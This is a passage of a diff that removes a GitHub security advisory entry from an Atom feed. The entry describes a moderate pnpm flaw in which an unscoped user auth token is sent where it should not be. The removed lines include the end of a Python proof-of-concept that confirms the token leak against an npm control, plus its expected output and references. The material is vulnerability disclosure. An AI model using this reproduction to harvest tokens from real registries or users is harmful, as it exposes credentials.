-    )
-    if pnpm_leaked and not npm_leaked:
-        print("CHECK pnpm_leaked=true npm_control_held=true result=pass")
-        print("VULNERABLE_BEHAVIOR_CONFIRMED")
-        print("RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD")
-        print("RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED")
-        return 0
-    if pnpm_leaked and npm_leaked:
-        print("CHECK pnpm_leaked=true npm_control_held=false result=fail")
-        print("RESULT_BOTH_TOOLS_SENT_AUTH")
-        return 2
-    print("CHECK pnpm_leaked=false result=fail")
-    print("RESULT_NO_PNPM_AUTH_LEAK")
-    return 1
-
-
-if __name__ == "__main__":
-    sys.exit(main())
-</code></pre>
-<h2 id="abbreviated-expected-output">Abbreviated Expected Output</h2>
-<pre><code class="language-text">TARGET_VERSION=pnpm 11.2.1; npm 10.9.7
-ENVIRONMENT_READY
-...
-OBSERVED_PNPM_AUTH_HITS=3
-OBSERVED_NPM_AUTH_HITS=0
-COMMAND_EXIT_CODE=pnpm:0 npm:1
-CHECK pnpm_leaked=true npm_control_held=true result=pass
-VULNERABLE_BEHAVIOR_CONFIRMED
-RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD
-RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED
-</code></pre>
-<p>Reporter: JUNYI LIU</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-cjhr-43r9-cfmw">https://github.com/pnpm/pnpm/security/advisories/GHSA-cjhr-43r9-cfmw</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50017">https://nvd.nist.gov/vuln/detail/CVE-2026-50017</a></li>
-<li><a href="https://github.com/advisories/GHSA-cjhr-43r9-cfmw">https://github.com/advisories/GHSA-cjhr-43r9-cfmw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cjhr-43r9-cfmw</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-26T22:59:25.000Z</published>
     </entry>
 </feed>
